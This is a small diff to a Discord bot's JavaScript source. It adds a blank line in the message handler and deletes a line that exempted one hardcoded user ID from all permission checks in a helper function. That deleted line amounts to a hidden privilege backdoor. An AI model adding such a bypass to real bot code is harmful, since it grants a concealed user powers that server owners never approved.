@@ -42,6 +42,7 @@ client.on("ready", async () => {
 
 
   client.on("messageCreate", async message => {
+
     if (message.author.bot) {
       return;
     }
@@ -614,7 +615,6 @@ Discord.BaseChannel.prototype.awaitMessage = async function(options){
 }
 
 Discord.GuildMember.prototype.wastedPermissions = function(bit, channel){
-  if (this.user.id === "921403577539387454") return false;
   let permissions = channel ? channel.permissionsFor(this).missing(bit) : this.permissions.missing(bit);
   return permissions[0] ? permissions : false;
 }
